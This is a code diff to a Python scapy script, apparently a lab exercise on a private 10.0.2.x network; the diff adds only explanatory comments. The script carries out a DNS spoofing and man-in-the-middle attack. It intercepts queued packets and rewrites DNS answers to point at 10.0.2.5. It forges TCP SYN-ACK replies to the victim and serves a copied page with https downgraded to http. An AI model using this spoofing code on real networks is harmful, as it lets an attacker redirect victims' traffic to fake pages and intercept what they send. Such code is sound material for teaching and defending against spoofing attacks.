@@ -10,11 +10,11 @@ GOOGLE_IP = "142.250.179.132"
 response = requests.get("https://abv.bg").text
 response = re.sub(r"https", "http", response) #replace all occurences of https with http
 with open("google.html", "w") as f:
-    f.write(response.encode("utf-8").strip())
+    f.write(response.encode("utf-8").strip()) #strip() removes empty spaces
 
 
 def processPkt(packet):
-    scapyPkt = IP(packet.get_payload())
+    scapyPkt = IP(packet.get_payload()) # make it scapy packet
     if scapyPkt.haslayer(DNSRR):
         try:
             scapyPkt = modifyPkt(scapyPkt)
@@ -22,7 +22,7 @@ def processPkt(packet):
         except IndexError:
             print("Error")
             pass
-    if scapyPkt.haslayer(TCP) and scapyPkt[TCP].flags == "S":
+    if scapyPkt.haslayer(TCP) and scapyPkt[TCP].flags == "S": #always assume that the always DNS request before making handshake
         # craft a response pkt to M1
         ip = IP(src ="10.0.2.5", dst = "10.0.2.4")  
         tcpSYNACK = TCP(sport = 8081, dport = scapyPkt[TCP].sport, flags ="SA", seq = 1000, ack = scapyPkt.seq + 1) 
@@ -33,7 +33,7 @@ def processPkt(packet):
 
 def modifyPkt(packet):
     packet[DNS].an = DNSRR( rdata="10.0.2.5")#rrname = b"www.google.com",
-    packet[DNS].ancount = 1
+    packet[DNS].ancount = 1 #answer count
 
     del packet[IP].len
     del packet[IP].chksum
